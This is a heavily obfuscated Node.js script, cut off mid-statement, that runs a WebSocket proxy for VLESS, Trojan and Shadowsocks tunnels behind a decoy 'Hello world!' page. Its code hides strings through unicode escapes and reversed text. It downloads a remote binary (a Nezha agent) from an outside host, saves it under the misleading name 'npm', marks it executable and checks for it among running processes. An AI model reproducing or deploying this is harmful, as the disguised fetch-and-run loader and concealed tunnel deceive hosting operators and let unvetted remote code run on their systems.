#!/usr/bin/env node
var _0xfc8c=(254790^254787)+(262773^262770);const os=require("\u006F\u0073");_0xfc8c=(179008^179011)+(681048^681040);const http=require("\u0068\u0074\u0074\u0070");const fs=require("\u0066\u0073");const axios=require("\u0061\u0078\u0069\u006F\u0073");var _0x2618f;const net=require("\u006E\u0065\u0074");_0x2618f='\u0069\u0062\u0062\u006A\u0070\u0068';var _0xb57f6c;const path=require("\u0070\u0061\u0074\u0068");_0xb57f6c=364482^364480;var _0x58a8ce=(546924^546920)+(499565^499567);const crypto=require("\u0063\u0072\u0079\u0070\u0074\u006F");_0x58a8ce=(926546^926547)+(171879^171873);const{"Buffer":Buffer}=require("\u0062\u0075\u0066\u0066\u0065\u0072");const{"exec":exec,"execSync":execSync}=require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073");const{'\u0057\u0065\u0062\u0053\u006F\u0063\u006B\u0065\u0074':WebSocket,'\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0065\u0062\u0053\u006F\u0063\u006B\u0065\u0074\u0053\u0074\u0072\u0065\u0061\u006D':createWebSocketStream}=require("\u0077\u0073");var _0xc_0xf9e;const UUID=process['\u0065\u006E\u0076']['\u0055\u0055\u0049\u0044']||"9dca428d070a-93bb-c964-c015-860805ec".split("").reverse().join("");_0xc_0xf9e=(782673^782674)+(998614^998611);const NEZHA_SERVER=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0053\u0045\u0052\u0056\u0045\u0052']||'';const NEZHA_PORT=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0050\u004F\u0052\u0054']||'';const NEZHA_KEY=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u004B\u0045\u0059']||'';const DOMAIN=process['\u0065\u006E\u0076']['\u0044\u004F\u004D\u0041\u0049\u004E']||"moc.niamod-ruoy".split("").reverse().join("");var _0x67555g=(414423^414423)+(417873^417877);const AUTO_ACCESS=process['\u0065\u006E\u0076']['\u0041\u0055\u0054\u004F\u005F\u0041\u0043\u0043\u0045\u0053\u0053']||false;_0x67555g=(443320^443323)+(157830^157838);const WSPATH=process['\u0065\u006E\u0076']['\u0057\u0053\u0050\u0041\u0054\u0048']||UUID['\u0073\u006C\u0069\u0063\u0065'](146474^146474,985590^985598);var _0xddf;const SUB_PATH=process['\u0065\u006E\u0076']['\u0053\u0055\u0042\u005F\u0050\u0041\u0054\u0048']||"\u0062\u006F\u0064\u0079\u0062\u0075\u0069\u006C\u0064\u0069\u006E\u0067";_0xddf=(904467^904467)+(197812^197820);var _0x2e_0x377;const NAME=process['\u0065\u006E\u0076']['\u004E\u0041\u004D\u0045']||"\u0062\u006F\u0064\u0079\u0062\u0075\u0069\u006C\u0064\u0069\u006E\u0067";_0x2e_0x377=(553337^553329)+(144362^144365);var _0x9e9gf;const PORT=process['\u0065\u006E\u0076']['\u0050\u004F\u0052\u0054']||602160^605064;_0x9e9gf=(310441^310440)+(738442^738441);let uuid=UUID['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u002D','\u0067'),''),CurrentDomain=DOMAIN,Tls="slt".split("").reverse().join(""),CurrentPort=139152^138795,ISP='';var _0x6ff=(499619^499621)+(320767^320766);const DNS_SERVERS=["\u0038\u002E\u0038\u002E\u0034\u002E\u0034","1.1.1.1".split("").reverse().join("")];_0x6ff="kjjbbh".split("").reverse().join("");const BLOCKED_DOMAINS=["\u0073\u0070\u0065\u0065\u0064\u0074\u0065\u0073\u0074\u002E\u006E\u0065\u0074","moc.tsaf".split("").reverse().join(""),"nc.tsetdeeps".split("").reverse().join(""),"\u0073\u0070\u0065\u0065\u0064\u002E\u0063\u006C\u006F\u0075\u0064\u0066\u006C\u0061\u0072\u0065\u002E\u0063\u006F\u006D","\u0073\u0070\u0065\u0065\u0064\u006F\u0066\u002E\u006D\u0065","ten.ymtset".split("").reverse().join(""),"\u0062\u0061\u006E\u0064\u0077\u0069\u0064\u0074\u0068\u002E\u0070\u006C\u0061\u0063\u0065","oi.deeps".split("").reverse().join(""),"\u006C\u0069\u0062\u0072\u0065\u0073\u0070\u0065\u0065\u0064\u002E\u006F\u0072\u0067","gro.kcehcdeeps".split("").reverse().join("")];function isBlockedDomain(host){if(!host)return false;const _0xbe2d=host['\u0074\u006F\u004C\u006F\u0077\u0065\u0072\u0043\u0061\u0073\u0065']();return BLOCKED_DOMAINS['\u0073\u006F\u006D\u0065'](blocked=>{return _0xbe2d===blocked||_0xbe2d['\u0065\u006E\u0064\u0073\u0057\u0069\u0074\u0068']("\u002E"+blocked);});}async function getisp(){try{const _0xc5c7d=await axios['\u0067\u0065\u0074']("pioeg/bs.pi.ipa//:sptth".split("").reverse().join(""),{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0055\u0073\u0065\u0072\u002D\u0041\u0067\u0065\u006E\u0074":"\u004D\u006F\u007A\u0069\u006C\u006C\u0061\u002F\u0035\u002E\u0030","timeout":3000}});const _0x45886e=_0xc5c7d['\u0064\u0061\u0074\u0061'];ISP=`${_0x45886e['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']}-${_0x45886e['\u0069\u0073\u0070']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u0020','\u0067'),"\u005F");}catch(e){try{const _0x76c38e=await axios['\u0067\u0065\u0074']("nosj/moc.ipa-pi//:ptth".split("").reverse().join(""),{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'User-Agent':"\u004D\u006F\u007A\u0069\u006C\u006C\u0061\u002F\u0035\u002E\u0030","timeout":3000}});const _0x424c7c=_0x76c38e['\u0064\u0061\u0074\u0061'];ISP=`${_0x424c7c['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u0043\u006F\u0064\u0065']}-${_0x424c7c['\u006F\u0072\u0067']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u0020','\u0067'),"\u005F");}catch(e2){ISP="nwonknU".split("").reverse().join("");}}}async function getip(){if(!DOMAIN||DOMAIN==="\u0079\u006F\u0075\u0072\u002D\u0064\u006F\u006D\u0061\u0069\u006E\u002E\u0063\u006F\u006D"){try{const _0x13fca=await axios['\u0067\u0065\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002D\u0069\u0070\u0076\u0034\u002E\u0069\u0070\u002E\u0073\u0062\u002F\u0069\u0070",{"timeout":5000});var _0x7g375a;const _0xc9322d=_0x13fca['\u0064\u0061\u0074\u0061']['\u0074\u0072\u0069\u006D']();_0x7g375a="qpaoeg".split("").reverse().join("");CurrentDomain=_0xc9322d,Tls="\u006E\u006F\u006E\u0065",CurrentPort=PORT;}catch(e){console['\u0065\u0072\u0072\u006F\u0072']("\u0046\u0061\u0069\u006C\u0065\u0064\u0020\u0074\u006F\u0020\u0067\u0065\u0074\u0020\u0049\u0050",e['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']);CurrentDomain="moc.niamod-ruoy-egnhac".split("").reverse().join(""),Tls="\u0074\u006C\u0073",CurrentPort=386417^386250;}}else{;CurrentDomain=DOMAIN,Tls="\u0074\u006C\u0073",CurrentPort=860670^860229;}}var _0x9e0g=(422493^422490)+(430216^430219);const httpServer=http['\u0063\u0072\u0065\u0061\u0074\u0065\u0053\u0065\u0072\u0076\u0065\u0072'](async(req,res)=>{if(req['\u0075\u0072\u006C']==="\u002F"){var _0x_0x6a8;const filePath=path['\u006A\u006F\u0069\u006E'](__dirname,"\u0069\u006E\u0064\u0065\u0078\u002E\u0068\u0074\u006D\u006C");_0x_0x6a8='\u006C\u006E\u006D\u006F\u0068\u006A';fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065'](filePath,"\u0075\u0074\u0066\u0038",(err,content)=>{if(err){res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](806034^805978,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0074\u0065\u0078\u0074\u002F\u0068\u0074\u006D\u006C"});res['\u0065\u006E\u0064']("!dlrow olleH".split("").reverse().join(""));return;}res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](996544^996360,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'text/html'});res['\u0065\u006E\u0064'](content);});return;}else if(req['\u0075\u0072\u006C']===`/${SUB_PATH}`){await getisp();await getip();var _0x32982b;const namePart=NAME?`${NAME}-${ISP}`:ISP;_0x32982b="olhjjc".split("").reverse().join("");var _0x25c3dd=(161316^161313)+(936169^936168);const tlsParam=Tls==="\u0074\u006C\u0073"?"\u0074\u006C\u0073":"\u006E\u006F\u006E\u0065";_0x25c3dd=(693545^693536)+(296195^296192);var _0x507b=(731453^731450)+(791952^791955);const ssTlsParam=Tls==="\u0074\u006C\u0073"?"\u0074\u006C\u0073\u003B":'';_0x507b=(593335^593342)+(731747^731747);const vlsURL=`vless://${UUID}@${CurrentDomain}:${CurrentPort}?encryption=none&security=${tlsParam}&sni=${CurrentDomain}&fp=chrome&type=ws&host=${CurrentDomain}&path=%2F${WSPATH}#${namePart}`;const troURL=`trojan://${UUID}@${CurrentDomain}:${CurrentPort}?security=${tlsParam}&sni=${CurrentDomain}&fp=chrome&type=ws&host=${CurrentDomain}&path=%2F${WSPATH}#${namePart}`;const ssMethodPassword=Buffer['\u0066\u0072\u006F\u006D'](`none:${UUID}`)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join(""));const ssURL=`ss://${ssMethodPassword}@${CurrentDomain}:${CurrentPort}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D${CurrentDomain};path%3D%2F${WSPATH};${ssTlsParam}sni%3D${CurrentDomain};skip-cert-verify%3Dtrue;mux%3D0#${namePart}`;var _0x34ab;const subscription=vlsURL+"\u000A"+troURL+"\u000A"+ssURL;_0x34ab=835030^835026;const base64Content=Buffer['\u0066\u0072\u006F\u006D'](subscription)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034");res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](569810^569626,{'Content-Type':"\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E"});res['\u0065\u006E\u0064'](base64Content+"\u000A");}else{res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](144672^144564,{'Content-Type':'text/plain'});res['\u0065\u006E\u0064']("\u004E\u006F\u0074\u0020\u0046\u006F\u0075\u006E\u0064\u000A");}});_0x9e0g=(630841^630845)+(321036^321033);function resolveHost(host){return new Promise((resolve,reject)=>{if(new RegExp("$)?]9-0[]9-0[?]10[|]9-0[]4-0[2|]5-0[52:?(}3{).\\)?]9-0[]9-0[?]10[|]9-0[]4-0[2|]5-0[52:?(:?(^".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](host)){resolve(host);return;}let _0xd17ece=665703^665703;function _0x0c07ed(){if(_0xd17ece>=DNS_SERVERS['\u006C\u0065\u006E\u0067\u0074\u0068']){reject(new Error(`Failed to resolve ${host} with all DNS servers`));return;}const _0x6a_0x769=DNS_SERVERS[_0xd17ece];_0xd17ece++;var _0x489f6a=(577020^577022)+(905189^905191);const _0x3a38c=`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;_0x489f6a=(145488^145495)+(471323^471326);axios['\u0067\u0065\u0074'](_0x3a38c,{'\u0074\u0069\u006D\u0065\u006F\u0075\u0074':5000,'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'\u0041\u0063\u0063\u0065\u0070\u0074':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u0064\u006E\u0073\u002D\u006A\u0073\u006F\u006E"}})['\u0074\u0068\u0065\u006E'](response=>{const _0x85644e=response['\u0064\u0061\u0074\u0061'];if(_0x85644e['\u0053\u0074\u0061\u0074\u0075\u0073']===(553122^553122)&&_0x85644e['\u0041\u006E\u0073\u0077\u0065\u0072']&&_0x85644e['\u0041\u006E\u0073\u0077\u0065\u0072']['\u006C\u0065\u006E\u0067\u0074\u0068']>(602159^602159)){var _0xf82b6d=(686637^686628)+(591096^591097);const _0xeg5f=_0x85644e['\u0041\u006E\u0073\u0077\u0065\u0072']['\u0066\u0069\u006E\u0064'](record=>record['\u0074\u0079\u0070\u0065']===(460813^460812));_0xf82b6d=243332^243341;if(_0xeg5f){resolve(_0xeg5f['\u0064\u0061\u0074\u0061']);return;}}_0x0c07ed();})['\u0063\u0061\u0074\u0063\u0068'](error=>{_0x0c07ed();});}_0x0c07ed();});}function handleVlsConnection(ws,msg){const[VERSION]=msg;const _0xb89f6g=msg['\u0073\u006C\u0069\u0063\u0065'](369904^369905,905350^905367);if(!_0xb89f6g['\u0065\u0076\u0065\u0072\u0079']((v,i)=>v==parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i*(220376^220378),884043^884041),287448^287432)))return false;let i=msg['\u0073\u006C\u0069\u0063\u0065'](613253^613268,976978^976960)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']()+(792929^792946);const _0xd17d=msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=674536^674538)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](832472^832472);const _0x9fb=msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=917535^917534)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']();var _0x81cfb=(910210^910209)+(394278^394279);const _0x7b_0x02c=_0x9fb==(613362^613363)?msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=428037^428033)['\u006A\u006F\u0069\u006E']("\u002E"):_0x9fb==(832247^832245)?new TextDecoder()['\u0064\u0065\u0063\u006F\u0064\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i+(356625^356624),i+=(121689^121688)+msg['\u0073\u006C\u0069\u0063\u0065'](i,i+(992956^992957))['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']())):_0x9fb==(953700^953703)?msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=967319^967303)['\u0072\u0065\u0064\u0075\u0063\u0065']((s,b,i,a)=>i%(976671^976669)?s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i-(262270^262271),i+(789783^789782))):s,[])['\u006D\u0061\u0070'](b=>b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](659622^659622)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](486816^486832))['\u006A\u006F\u0069\u006E']("\u003A"):'';_0x81cfb=(206101^206102)+(218883^218886);if(isBlockedDomain(_0x7b_0x02c)){ws['\u0063\u006C\u006F\u0073\u0065']();return false;}ws['\u0073\u0065\u006E\u0064'](new Uint8Array([VERSION,872596^872596]));var _0xbd2e=(870296^870289)+(166002^166011);const _0x15ff=createWebSocketStream(ws);_0xbd2e=470968^470973;resolveHost(_0x7b_0x02c)['\u0074\u0068\u0065\u006E'](resolvedIP=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':resolvedIP,"port":_0xd17d},function(){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));_0x15ff['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x15ff);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});})['\u0063\u0061\u0074\u0063\u0068'](error=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':_0x7b_0x02c,"port":_0xd17d},function(){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));_0x15ff['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x15ff);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});return!![];}function handleTrojConnection(ws,msg){try{if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']<(299588^299646))return false;const _0x53d1f=msg['\u0073\u006C\u0069\u0063\u0065'](993609^993609,629387^629427)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();const _0x3e23bf=[UUID];var _0x2_0x7ca=(687234^687237)+(836357^836365);let _0x747a6f=null;_0x2_0x7ca=775220^775219;for(const _0xe7ff of _0x3e23bf){const _0xbeea=crypto['\u0063\u0072\u0065\u0061\u0074\u0065\u0048\u0061\u0073\u0068']("\u0073\u0068\u0061\u0032\u0032\u0034")['\u0075\u0070\u0064\u0061\u0074\u0065'](_0xe7ff)['\u0064\u0069\u0067\u0065\u0073\u0074']("\u0068\u0065\u0078");if(_0xbeea===_0x53d1f){_0x747a6f=_0xe7ff;break;}}if(!_0x747a6f)return false;var _0xa4g=(472645^472640)+(171724^171717);let _0xdg864a=154546^154506;_0xa4g=(413981^413980)+(832741^832739);if(msg[_0xdg864a]===(594890^594887)&&msg[_0xdg864a+(713183^713182)]===(510798^510788)){_0xdg864a+=707495^707493;}const _0x416a=msg[_0xdg864a];if(_0x416a!==(117947^117946))return false;_0xdg864a+=240872^240873;var _0xe_0x197=(356310^356307)+(261376^261380);const _0xc2_0xce8=msg[_0xdg864a];_0xe_0x197=(187816^187809)+(590259^590258);_0xdg864a+=818790^818791;let _0x692ee,_0x1d9b;if(_0xc2_0xce8===(778769^778768)){_0x692ee=msg['\u0073\u006C\u0069\u0063\u0065'](_0xdg864a,_0xdg864a+(147898^147902))['\u006A\u006F\u0069\u006E']("\u002E");_0xdg864a+=416471^416467;}else if(_0xc2_0xce8===(546818^546817)){var _0x117e;const _0x0d4d3d=msg[_0xdg864a];_0x117e=492974^492968;_0xdg864a+=831549^831548;_0x692ee=msg['\u0073\u006C\u0069\u0063\u0065'](_0xdg864a,_0xdg864a+_0x0d4d3d)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();_0xdg864a+=_0x0d4d3d;}else if(_0xc2_0xce8===(808540^808536)){_0x692ee=msg['\u0073\u006C\u0069\u0063\u0065'](_0xdg864a,_0xdg864a+(104024^104008))['\u0072\u0065\u0064\u0075\u0063\u0065']((s,b,i,a)=>i%(790884^790886)?s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i-(932364^932365),i+(807669^807668))):s,[])['\u006D\u0061\u0070'](b=>b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](437775^437775)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](599517^599501))['\u006A\u006F\u0069\u006E']("\u003A");_0xdg864a+=205458^205442;}else{return false;}_0x1d9b=msg['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](_0xdg864a);_0xdg864a+=177925^177927;if(_0xdg864a<msg['\u006C\u0065\u006E\u0067\u0074\u0068']&&msg[_0xdg864a]===(866867^866878)&&msg[_0xdg864a+(785653^785652)]===(915842^915848)){_0xdg864a+=359363^359361;}if(isBlockedDomain(_0x692ee)){ws['\u0063\u006C\u006F\u0073\u0065']();return false;}const _0x47ge=createWebSocketStream(ws);resolveHost(_0x692ee)['\u0074\u0068\u0065\u006E'](resolvedIP=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':resolvedIP,'\u0070\u006F\u0072\u0074':_0x1d9b},function(){if(_0xdg864a<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xdg864a));}_0x47ge['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](_0x47ge);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});})['\u0063\u0061\u0074\u0063\u0068'](error=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':_0x692ee,"port":_0x1d9b},function(){if(_0xdg864a<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xdg864a));}_0x47ge['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x47ge);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});return!![];}catch(error){return false;}}function handleSsConnection(ws,msg){try{var _0xd3d;let _0xb88g5e=826446^826446;_0xd3d=(336170^336168)+(768148^768150);const _0x1bf87c=msg[_0xb88g5e];_0xb88g5e+=145158^145159;let _0x4d4bd,_0xcde;if(_0x1bf87c===(435202^435203)){_0x4d4bd=msg['\u0073\u006C\u0069\u0063\u0065'](_0xb88g5e,_0xb88g5e+(851072^851076))['\u006A\u006F\u0069\u006E']("\u002E");_0xb88g5e+=482353^482357;}else if(_0x1bf87c===(965183^965180)){var _0xeg497d=(475639^475637)+(427185^427189);const _0x9d69de=msg[_0xb88g5e];_0xeg497d=(247280^247282)+(356764^356756);_0xb88g5e+=827488^827489;_0x4d4bd=msg['\u0073\u006C\u0069\u0063\u0065'](_0xb88g5e,_0xb88g5e+_0x9d69de)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();_0xb88g5e+=_0x9d69de;}else if(_0x1bf87c===(932377^932381)){_0x4d4bd=msg['\u0073\u006C\u0069\u0063\u0065'](_0xb88g5e,_0xb88g5e+(625291^625307))['\u0072\u0065\u0064\u0075\u0063\u0065']((s,b,i,a)=>i%(661924^661926)?s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i-(614382^614383),i+(506482^506483))):s,[])['\u006D\u0061\u0070'](b=>b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](904503^904503)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](307385^307369))['\u006A\u006F\u0069\u006E']("\u003A");_0xb88g5e+=844018^844002;}else{return false;}_0xcde=msg['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](_0xb88g5e);_0xb88g5e+=806495^806493;if(isBlockedDomain(_0x4d4bd)){ws['\u0063\u006C\u006F\u0073\u0065']();return false;}var _0x3_0x3d9;const _0x2gab1a=createWebSocketStream(ws);_0x3_0x3d9=590698^590702;resolveHost(_0x4d4bd)['\u0074\u0068\u0065\u006E'](resolvedIP=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':resolvedIP,"port":_0xcde},function(){if(_0xb88g5e<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xb88g5e));}_0x2gab1a['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x2gab1a);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});})['\u0063\u0061\u0074\u0063\u0068'](error=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({"host":_0x4d4bd,'\u0070\u006F\u0072\u0074':_0xcde},function(){if(_0xb88g5e<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xb88g5e));}_0x2gab1a['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x2gab1a);})['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{});});return!![];}catch(error){return false;}}const wss=new WebSocket['\u0053\u0065\u0072\u0076\u0065\u0072']({"server":httpServer});wss['\u006F\u006E']("\u0063\u006F\u006E\u006E\u0065\u0063\u0074\u0069\u006F\u006E",(ws,req)=>{var _0x723e=(189700^189698)+(327565^327557);const url=req['\u0075\u0072\u006C']||'';_0x723e=647850^647854;var _0xf71a=(201726^201723)+(948589^948589);const expectedPath=`/${WSPATH}`;_0xf71a=351836^351836;if(!url['\u0073\u0074\u0061\u0072\u0074\u0073\u0057\u0069\u0074\u0068'](expectedPath)){ws['\u0063\u006C\u006F\u0073\u0065']();return;}ws['\u006F\u006E\u0063\u0065']("\u006D\u0065\u0073\u0073\u0061\u0067\u0065",msg=>{if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']>(657639^657654)&&msg[405556^405556]===(926414^926414)){const id=msg['\u0073\u006C\u0069\u0063\u0065'](105300^105301,612879^612894);const isVless=id['\u0065\u0076\u0065\u0072\u0079']((v,i)=>v==parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i*(626387^626385),465888^465890),835410^835394));if(isVless){if(!handleVlsConnection(ws,msg)){ws['\u0063\u006C\u006F\u0073\u0065']();}return;}}if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']>=(470408^470450)){if(handleTrojConnection(ws,msg)){return;}}if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']>(175098^175098)&&(msg[747475^747475]===(842924^842925)||msg[975881^975881]===(825271^825268)||msg[134481^134481]===(537508^537504))){if(handleSsConnection(ws,msg)){return;}}ws['\u0063\u006C\u006F\u0073\u0065']();})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});const getDownloadUrl=()=>{var _0x52ba=(400645^400652)+(395392^395393);const arch=os['\u0061\u0072\u0063\u0068']();_0x52ba=(935189^935196)+(418453^418448);if(arch==="\u0061\u0072\u006D"||arch==="\u0061\u0072\u006D\u0036\u0034"||arch==="\u0061\u0061\u0072\u0063\u0068\u0036\u0034"){if(!NEZHA_PORT){return"1v/nm.cyn.ssss.46mra//:sptth".split("").reverse().join("");}else{return"tnega/nm.cyn.ssss.46mra//:sptth".split("").reverse().join("");}}else{if(!NEZHA_PORT){return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";}else{return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074";}}};var _0xf50e1b=(737725^737725)+(930347^930349);const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{var _0x2a9d0f;const url=getDownloadUrl();_0x2a9d0f=(474940^474938)+(383538^383541);var _0xaga7db=(905286^905280)+(491436^491428);const response=await axios({"method":"\u0067\u0065\u0074","url":url,'\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065\u0054\u0079\u0070\u0065':'stream'});_0xaga7db="kmkpmp".split("").reverse().join("");var _0x630d2a;const writer=fs['\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0072\u0069\u0074\u0065\u0053\u0074\u0072\u0065\u0061\u006D']("mpn".split("").reverse().join(""));_0x630d2a=(308538^308531)+(447303^447298);response['\u0064\u0061\u0074\u0061']['\u0070\u0069\u0070\u0065'](writer);return new Promise((resolve,reject)=>{writer['\u006F\u006E']("\u0066\u0069\u006E\u0069\u0073\u0068",()=>{console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0064\u006F\u0077\u006E\u006C\u006F\u0061\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079");exec("\u0063\u0068\u006D\u006F\u0064\u0020\u002B\u0078\u0020\u006E\u0070\u006D",err=>{if(err)reject(err);resolve();});});writer['\u006F\u006E']("rorre".split("").reverse().join(""),reject);});}catch(err){throw err;}};_0xf50e1b=967544^967549;var _0xbdea;const runnz=async()=>{try{var _0xd160ee;const status=execSync("\"mp]n[/.\" perg | \"perg\" v- perg | xua sp".split("").reverse().join(""),{"encoding":"\u0075\u0074\u0066\u002D\u0038"});_0xd160ee=(450121^450124)+(631941^631940);if(status['\u0074\u0072\u0069\u006D']()!==''){console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0069\u0073\u0020\u0061\u006C\u0072\u0065\u0061\u0064\u0079\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002C\u0020\u0073\u006B\u0069\u0070\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002E\u002E\u002E");return;}}catch(e){}await downloadFile();let command='';var _0x64744f=(211848^211855)+(515311^515302);let 